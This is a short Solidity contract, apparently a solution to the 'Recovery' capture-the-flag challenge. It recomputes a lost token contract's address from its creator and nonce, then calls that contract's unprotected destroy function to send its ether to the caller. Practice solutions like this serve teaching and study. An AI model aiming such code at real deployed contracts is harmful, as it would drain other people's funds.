pragma solidity 0.8.15;

import "../challenge/Recovery.sol";

contract RecoveryAttacker {
    constructor(address target, bytes1 nonce) {
        SimpleToken token = SimpleToken(payable(getAddress(target, nonce)));
        token.destroy(payable(msg.sender));
    }

    function getAddress(address target, bytes1 nonce) private view returns (address) {
        return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), target, nonce)))));
    }
}